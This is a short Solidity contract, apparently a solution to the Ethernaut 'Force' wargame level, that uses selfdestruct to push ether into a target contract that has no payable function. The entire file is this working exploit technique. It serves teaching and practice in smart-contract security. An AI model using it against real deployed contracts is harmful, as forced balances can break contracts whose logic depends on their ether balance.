// Copy from https://ethernaut.openzeppelin.com/level/7
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        address payable addr = payable(address(target));
        selfdestruct(addr);
    }
}
